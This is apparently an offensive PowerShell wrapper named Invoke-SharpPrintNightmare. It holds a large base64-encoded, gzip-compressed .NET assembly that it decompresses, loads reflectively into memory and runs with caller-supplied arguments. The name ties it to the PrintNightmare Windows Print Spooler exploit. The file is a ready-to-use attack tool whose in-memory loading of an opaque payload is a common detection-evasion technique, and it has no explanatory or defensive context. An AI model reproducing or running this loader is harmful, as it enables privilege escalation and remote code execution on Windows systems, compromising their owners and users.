function Invoke-SharpPrintNightmare ($Params){
    if (!$SharpPrintNightmare_assembly){
        $compressed = "H4sIALL9sWUC/+1afXBcV3U/7+3u2w/ZQivZkhzL9rMc22tbWuvLjm38JUsrexNZkqX1F1GQV7tP8sa7+9bv7dqWgx2RpJSUJCRlQoqBQiDQhDBDEzoBQjtACdMhNHyUaQmUpikw0FAGSph2Cu3E/Z3z3u5KshJC+0c7A09659577rnnnHvuued+7Dv8pvvJQ0RevFevEn2anGc//fpnFm/tmqdr6c+Cz639tDL43NrE6YytFyxz2krm9FQynzeL+qShW6W8nsnr/cNjes5MG9GlS0PXuzxGYkSDioee773xl2W+L1Ir1SgdRJtRCDm4t8UBdLynXO04rzp6E1VT+qCD58dD+3+PqE7+q2klkacLfIfJ4atri3dyCZLiIaId9Bs80C8wpxhA+dCccrRoXCgivWeT26/NVb3nsDgVtWwrRa5u3Hdm2jafDtbYH7WMrJlydJWBYV4919AdWKjmVNxJD0kTHw1uJIqsJVJIeGn0Gz6r1cgyDNrmhg6NTBI+4cvLgQmpHq9vRT1FfODavj7SCJyF2kKkCTm7GcBcARC5jnMrARo3axEvE7c5xFtei1iLoMPahsbNTZufjnjmiDBfW0TT5rLGRCs7PPQjRUwXXlazbIn1frRdan0JsMFr/YwTn9rmVe9rP2BtVcC2hQX0VnIPVnLfqOTyajn37nKuMbIKUG28EtKskocK5moU28JOwbqNMWvEYPdlmjtr1eYrS9UVVxq86nVXGnzBsDfss+vRvwYN9U2dA4ArO/arTVdq/JFa4BtNnbu4lkXeC17S2SWBSCuSnY9iRKwnPK4iTaLIjnfx0INLZ1BdeWXJjrtQjLyBJfjD/oZAY0NwS3c4EA5+GJ6nNoTCodvQymuuYwG/qKhfxi/ZUhsONp1oCIaD4cB9ma4vOZLbOq2wlwphf+M7mY2QWt3ARK5nbcVAC/SynkB1QNR36r+Jsjan/HOvS68F/JGlUNiq8S3ErF+IeWFJWGvzhzVzPZDf3Uy9Lc5U+TDeGzD231HcOYSnocNLRxSOIxSup1eWs+b1tOISVPDWk7UPvC+tkbx6abWknkurnLrbua7FyT/EeXibV41sgNCay+DnXVN3Sud5emqJdg/zjWzkfkUAljqIYGMEoSHkbQ4GIiF2bevDPteTG7z13sjmsiNL94IRzI4QhH2urFRTg2/HfegEcD4Nlvfdg6ih+COAISFYKLdBczBhrSw5rLmiHamwmkgJ+9u7rFyVZ6SdRfsXaGTdq83z97APXuEL+9as3pu5evUqh7uVHT76hhO7w2rTvWCjrG9cM/5+Mwr6OrI+Aw4heyvbTMcYzaqRDvFlzezkCdwFcBl+7l3f3rThMrze+4oGRTW7GxXrZ7kmgtHbYm5jq27ZEzS3i/ECmnXZD+294nvCy7oDCPMG5IrousJ6itu2B/xhn7mDDWzu5PJnXwgF27Sg4z0BcxeSFxo2WB/yz3PdF8jP/VPEt5IU/1h5FVtD7/9zaqhjER1+egYYRMNwY6ixZpm4TLOEysZ6qlciNehKW431MljbbwT2oozCksCai1F/QILZRc1xGLdtUKu2M/z3ynT11nsiu7nXvq/LaO+RgcZA7pURbWwIbNmMkBJAUNnHg6RFsEiEPsK0j4gz+ML+W3ncAhi9QDhwqz/f9TXH2cLezdW4erEa95XKOtc0C/N7m2d5mb5ulr1+9axXfH8W3fbqvBDPapLD6M36JYc5MRuQHNaO2SByspYMkixGYUeM1+NbE2xU3xLiMV7G0b5FdAlZGwIIElW3tHtZOVW9jSnNA+ycfTwBapjvm9XbODX7ORw7FDHuQ9TGyqHNskdVVocuj/WFgBvsNreqTZEBwaq3HWSeWFW0zXRg7MYDiqycTgw51xPtiHZ3dHfuJBnpLODn0bd1l7GEo2dtkL5urGhl8tM2U5yApH/m+qNjtH+Vs09Zd/BovJ/3SSg/DxOuO5A1J137wq7K8dvVliB716+Ubmp01u1t7rYJM4Cu42jurMMEVWkpxzXHloLT3L0Tv0EX55lTT3Sv5qQaPeB7S1CjLo3hU94bg2+g9wUZ/4LXH9DI8DEcELhCY/hVyb8i8N+E5lnvLWj7qMBNgq/zfU7T6Fjofr9G/+H/FfA/8jHc5WHMXaEmwO+rjwPz5dAe0N8ZYPiEj+GI9kpIozt8TPk+P8McfULV6OVQEVpNSH6nl/ERgfd6WfM/Is73BRl+XaR8JnBF0egN/ltgyBWBTmC6A4z/e41hSnR7SWOau6TtZamd1YpUS1s9FjQ5IrKWBhuhzxHhGRGaAQ/3tLamyc8WfEbsqMgfxjb4L8HeSulhv1NSZX960b/Xy6Ugysvox2jdixHFOoOh2I43h3FcLqVHpLQcfyGljv4Ard+KMV9OnrV19LjK7XShrKN3YliPYmfdDDfxKANqI/2UGP5E8lcF3qEy/KTkOyT/N5JvBFxLT3rigB8MHVaPzNarR1RNuwKaY7O9SgLwLoE3C3yeGJqSn1QZ1gOW6ePqCcA/IYaKwOsANfon/4Cq1f3AMw44GWL4PY3h04J5BnA7fZ4moE83pdQRXc4FzRthYcXdqj+gn/Vk1Wrp49pZVXVL79YfCmTnlJ6jkuqhE8Ll3fSo/w41SN90S0/7z6pLSV1blbC0wvMXgXeoSytcngq9U63WbQo9pIZpibR7gJ71P6I2U8s6p/RM4GPqCnrL9U5pd+gJtYUurC+XnlZX0aENVXmraERKDzS3Bz+Pukcqdc+g9F9S+qEy49Xk8OBI/0TgK6pOyzZW220gfWOV5waKSOlO2oNVaQNtk9JbpW5jmcsptuBG2rvR8diUZ7uySbz2aIjhJ/0M/9PD0edrfo4VPg7s1OXlCPf7AY4HTwrNVaH5ptAEPXV1Xurx1gH/A8Ef9HuAT3Kkp78LUgU/GWL6w7wWSK2PsAsAz69i4Pz0PIc8+qHQ/1Rj+u9pTI+9JTAO/I6f8QEv4+s9r62tWtH2HX7XkNxHj48OY+5tDIInsXVWAIZoE2AddQrcKbBXYFzgEYEnBSYBl1NG8mcFzgh8APA6+gKgTl8Wzt8QGFQYvtWRpeQCbbRWeSmwlTqVbwW20U6FNelV1nl2Ulw5GNpDm5TVsOVawOPYod4SGgf+50HsNJSVnimsPXf4LTqp/NhzAZjVNZcAvxZw2t5B7yH2mpPK86jtVD6iPQj479oVwJ7gByipfFvbibzH/1HQD4UeF/gk4EP+Z8GZNXyJXgx9HfBvQ98G/KvgPyJGbQz+hGaUUe/L1EIrgk3K9WSGNigv0Xlti7KEnlU7lLuV20LbgbEhvVdha6xQPgC+v6RLnsMKa3JUWQH8zcinvaeU9wjNw8oHPGeUx5S3ek3lYdH8YfH6x8TCDyuf9LThSNxBl5UgRobhDroTcDe9HXA/3QvYT38IeIgeAhyk9wGOCOUJtA/SOH0U8JS0SqNVlGroW2oUq+SLgCvpKuA6CniitIXWAnYLfKPAPsHfRFHAMcHcjJgfpRQNAp6hc4A23en5Ir0LUr4vcJ3yXkDdcyd9xaN73oH8djqg7sC7C+9uvHvxDlO/yrH/cSUCKXfTp2mXMq2c8uf8Y/7HQln6AdUpurJf8dFZj0r7FT99XPMgDdJDAQVpDT3HUVFpoF/AyweU5fRUyIu0iTYh7cec/kSA67ulvXe2vNqXn73eOXcqeErKh9R59yyCu99/Le6E19nt8NzyYM56MD5ezCYvVjAf5sQSR9Dg8MHhoe6uiZHR4WPx/tjoxPH40FCip+NVKrZ10O69OycmOrdNIDdtFPutzDnDsvdOurh4LF/KGVZyMmuc6qyUiqaF0mDGLiI5nElZpm1OFaPHM/nuLorni4D9o/FjkBIfGhie6KKBUj51qosSJiq397yKMt3bWBnafdhMl7LGXho0p838UduweisNJJ0Yi40ei/fFqHekf2IsMRrvS0z0Dx8fOjja2z8PeXSkihqNJY6ODk0cGBzuuyk+dBAkvYmjYxN9w6h3uCZOjsQWCIoPJWKjvX0JdGVBzYHeRN+hBbijQ8x8AXIoljg+PHoTjc3YRSMXjQ+70spdF+X6h4cSUGXk5MRAfDA2NpEYnugbPDqWcKvjQ9B2cHDieO/oUAzUYlqpkTZcJe2qqKHYcRe1UJvjE32jsf7YUCLeOzinASQym7GR4eHB2OjYtSPUHxvoPTqYWLx30DbWO5qInUhUOQ6MDh+e6I+PxvoSw6Mn6VwyWzImJihnp0wrm5nEUKfKRukzs1kjVcyYeTt60MgbViZFvek0FVKTQ4aRNjg3ahStUh7ZseSUcSiZT2eNNxmWOWwdzuRL9nDeiNvxPIRk0pQt2BdHkrZ93rTQspwZNQrZZMogOPnEYcO2k9MGVZ2b4v0Zu2Dakq+KoNFSvpjJGYmZQgVjZI2kXS71Zc1K/qBRZLoBy8y5GGaUMM8Yebfcn8xPQ+mSDVIXNXHaSQv9yWJyIMO5PjM/lZmWPLK26bDm8lAyh3qBwPRnLFjNtGYEwb3myZLnQqmcSZm5QqnoFo5bmaIxmMkbdIxHg5Wl9HmZZpIfO520CiM4OBWHMtOni7mkhTanDcDKQCE/UrQSJs5XpVSxZLkWIMd6MGOugPBh5pNFVj5XgNKWDCkQ6d4iTmWTUIcOljJzSv3GZGl6mk1fxaHxsYydmYfrtW0jN5mdSWSKi6KtZNqA0meqVYmkhfEesNB7OMGZa9uwVY9BY/jetZXOQJSg+6LV/YadsjKF+ZUD2eS0Pa8bsIEwgOMkL0huTj2QmeRkJpspsrSilUwVrxU0YiEizq0YMaxcxmalx4ziYnoXZiwewcWqcoVkfmaOAo6DC76YcTSp1o6VCgULk+VoPpfMY8ak+8y0MWakStY8MjijeBS6M41FwZo5hFVkMXeKGheAz1w0hqdAi5WmCFcyslOUSh8oTZXdzNUp6g4MDvIkHseZgrNCjSSLpymdzRY47c1mzdShgzjCJ7M0YBlGOX84admnkbp8y4pHWalUplCt4e6beSNfxNpjZGkQqmUpK7A3fS5ZyHR3RSGNknMLZzCtjKxbGHF+npHwEgdLyjBw2FPCyuQk2FCvhAModsYJDFQ47aSONTh2lCkyeZnT/WaOs2knSbk2mTPRuFQZkpRTdO1oTLlxlWRpjl1IGeKu1FsoZDMpaVtFLrA+xx44JMJFOnYB/IXGNX88P2USx99yI0SVs9SHAac+wyoHFdjkXCaN8pyogAq40bCs69UVnhLGhaKEJws2TovTMNYcNM8jhX8NJu2i0wnLMi0xs5Nz65xCVRAXqrsVpppTiqYcKEkllCVMhDbevnDi9qs/k5zOm3Yxk7IX2ifOKpqFMcM6l0kZ9rXmc6Jfpd6JcvBh9jF74bYpWl10bNZ2rDR5kyGR3YY5OUzxrJboQghqNmxjZm1eIIoYIvtaF6+ECHuRZVac0bWyu+Wj6u6PucI5aMC0ckhOD0/einYUu5ApUiGWP5exzHwOk0VGoa9kWZw/bJ4zhvjXN3QnbZ635zkoq8l1Eyk3cx46F9CDaNo6x2v9PF1iF2ThQyQx8qkZGi4Yeccckh01cmbROIA1mDHliMP5BTaoaJKGflyO20OlbHbYiuUKKNGmQTJpGm+ejuI8YZCFk2cE51GdYshbqLFoFx9g++KUo4JQ2EKfpCJKTvtp5NI0PIfLojzaR1F3TuqLlAB+DPksTS1OvXGoQn1QJLLMg9jnM+4kMCVIK6APi9ENolx0qfoBzwNL+xajHAUFooFI5lwaeYb9oLNdXR0+FG6X/qbQCqERJ29lTKcoznljdBo4C9qMAGbQvkhDSKeBL8JuXGeA0qALeHWcu3ahVRJS0siXaFJq08KV3thObKccJBWFugQ9mOc08imULOHGMrhsSo45F0mZfe//TKGNaDOOY+5O6gK2k7bjsMtpFOVO2oY6G60mX1Xpjb+GRwdqlY2v1TFLjJ8ERpn9h/+/ndBFpxRO4BnoEEWrsj/o4GKKVqzphHSOvUeH9twtG1y6cMZXfCyBwuO0D3/j8OEhaALMunF4Xg5ctlOPi4/DC0fpGOT0w/MGiXpvpna6BTzHZC6mIGsKfqij1C82crx7RGbnaeBZnzx0qXjsqilQZYUK+2hobEtPeNYhHqwt8381fsqlNkC2uCO/KDNfF38+Lj1Py2yzZfxmkBZlyLvR9/F5PMdcqQbwA65Oo4voNI7el/9Yv82vqR+tKlPExCt4vhQrTkYryrUJ4a3LyArna2q6XrWmu1yzr+919vu8ULDXYvWozvSm+S11aMxjTzWOp/Tw7y0ry9LZXkmJtDo8USJk7PXKPyNWyku0nRRvnBNvpl8vF1vGxkSbcdBVrc/UF1yv7cbLFGmkt0HPS5J2IqU1i/XEoZHebLmZtlRGriAzKyMxrk/mVUE8xPE3mv3iGJabAQzJcUyaUTQZp8MgT0kY5wVqCqQLO6VjSiWA7ZsXRI+5nchIKB2fE2zGxbF4sjvqxoG1RXk2XFIcy2mz+ECOX+OkVV42kQeTfs3iU6Ls0DRcnpADEliy7nRjOl30L8E03DbpxtRCRXsn+MwfKKU75rYZmUfHOtuQx8tcViRMufLWwtjv6ZtTkZfwraNysf2ALmobolxWVttkJUaUI2KU+GfZa3ceunS9KIOTd9sYlT2Bs9al53gNZuC6vMyocleikk4h+iYrkZSf52ebzv3xxifj733ql/o9b/t2iry6ogQ8CGc+ZMJhLtYyUKUc8+uqEj4ZvsXjV5pVrdlHVD/7oIeIm9T6SK2trW3w19TKU79sVVjHfyCse4nZAATAS6316UzoW15/VkFeaeCfDpRaJlBrNfJw4xo/mtUGmwOBZq4MtAA0B1CptDSrzKlZCFtaRGhL2K/VCrv60vL6GYW560rtKk+A1PpSePYzXKwvoSe0qta/vH72brUWPVLBbEWdogLxBWU1VZO71dWkekJKrSa42oBOzLaBfMIdbBrYUi3MFlh0Xq31B4PBQDP6G6q/FGB7hPyk1F8Kz37ZB/3rL7EVQxqpLc31l2A+poD9lPojzYFPXRw/tqLnxbu9/HOwly99vfKBoPxK7GPAl77eQPni18v3ubMPRpXbX2NnH138IqBNL9+ytenueXEP/2iOvza9r5Tlw86evFHC6S7bpo+UJnEWxP5ZDp57Jm+4IbkttW17587uHqNjx856JVHr5XNIcACb54RVsotKo6KqWtCj1UfwHlG1gEcLN+NtUbVaYK4PaK79ebib+XeiJaSxP4Sbwy11zQEYQAqoCfq5EGwOLiE/kMjU4Q9GU1axn/AwB0iRcYfzEWzPPz5putTUOFwDgbr6SEBxvwxczT/9JtTG41ayMDTnfJs4beEwoAQU94PAZoUaFrvx4qt0f19p0ui40IFlSqH6yn2K/peP6XpXR1cnkU/u2zcpdP22KWOys7Nnsr1np5Fq79m+rat9smun0b4jNbnNuGFbl5Hqdpl2OmNAdFCh66JDsUTlYqqtPEz8cQO0r11WqeKbtWxSToJ13Eav1Og9YOqZ94FjcOlPP+V+w0Bvw/vxQ3g3z/+WsG7Bt4WjY/1jb37g4Q++9KuHbny04+Xbv/uhL2W4c327xidLmWzaHk+ZuVwpD98b7zsWa+f+t3duv2Hb+CLWWxRnTt467l6bLlYfLaQn6U3xqkbF8lepizxT8bmliT4Tp0VDLkvE5w1DbmOc5+p60vfT//2jis35Y5xm/ubE+ZJ0zuN83bJjEXz5s9PF6E+/Cj0iMd1/Cq+nWnO/h9eCY1hkJwBj2DSMYUEfxpZgAukQFlj5Wpf+wvuzVxw+yjye++Z8D6ws0KZfcMfkRFLey8ZlJTKl/npplZBlmrcQczcPzvOn3n+VX6B5C2C5+9VrOf210HRU/nqwm+uQ73AQINx9Us7d1vCHP+UTTgc2JEzXMYeuILrMoOdJaUOL0I/QMtCX9XBOxCnRrzBP/9d3UivLL/Obv/Hih3fjHZWX5TeDPl7ZpuRl61XV+Dc7IfK3yPXgx3cD08KJLVGADaxKG1oEp9NjsmPhEyCfJNlPA/P4OCOblr0yyzwj1r/WniekP8Mu74zbn7I98v+LfvE4jchOKQ2ZKaGvjuvrHZ8e6dd8PgtHaeEYObbolROuIefrrJySfl27DmzjfzxnIv3ss5/bve9CLqufc9eBVqwVrbqRT5npTH56T+vRxED7jlbdLibz6WTWzBt7WmcMu3Xf3qWhpaHdSfd2XweLvL2ntWTld9mp00YuabfnyveM7Qjju5J2Lnqus1XPJfOZKcMuHpsrD8x0vcKsfG02Tyf+a9X516Q9rYdn5lwjR5OFQutWh0ORNwl8Rfw69elyJKOl7W5y3DIwlnG2BD0NviE8l8ka04b9Orl2t1a4zOVTucuWS35dLvn3tCb510Psf6xWvZTpTaUMGwKmklnbcDslTLYuok1Z9a3zdN+9tWIElHdvLRt1L/3u+W149jvfqr595+9M8dv4/Dfvj7DqADYAAA=="
        $bytes = [System.Convert]::FromBase64String($compressed)
        $input = New-Object System.IO.MemoryStream( , $bytes)
        $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo($output)
        $gzipStream.Close()
	    $input.Close()
	    [byte[]] $decompressed_bytes = $output.ToArray()
        $Script:SharpPrintNightmare_assembly = [System.Reflection.Assembly]::Load($decompressed_bytes)
        "Loaded!"
    }
    $SharpPrintNightmare_assembly.EntryPoint.Invoke($null, (, $Params.split()))
}